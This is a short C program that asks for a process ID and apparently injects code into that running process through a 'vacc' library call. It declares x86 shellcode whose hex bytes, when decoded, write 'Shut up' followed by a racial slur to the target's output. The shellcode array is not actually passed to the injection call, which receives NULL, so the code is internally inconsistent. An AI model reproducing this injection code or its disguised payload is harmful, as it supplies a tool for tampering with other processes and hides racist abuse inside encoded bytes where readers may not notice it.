#include "vacc.h"
#include <stdio.h>

int main()
{
    const unsigned char shellcode[] =                               "\x55\x89\xe5\x31\xd2\xb6\x0a\xc1\xe2\x08\x66\xba\x65\x72\x52\x68\x6e\x69\x67\x67\x68\x20\x75\x70\x20\x68\x53\x68\x75\x74\x31\xc0\xb0\x04\x31\xdb\x43\x89\xe1\x31\xd2\xb2\x0f\xcd\x80\x89\xec\x5d\xc3"; 

    pid_t pid = 0;
    printf("Enter the PID: ");

    scanf("%d", &pid);
    DBG("Injecting PID %u\n", pid);

    if(!pid)
    {
        fprintf(stderr, "PID of 0 is invalid.\n");
        return -1;
    }
    vacc v = vacc_create(pid);

    vaccinate(&v, NULL, 0);

    return 0;
}
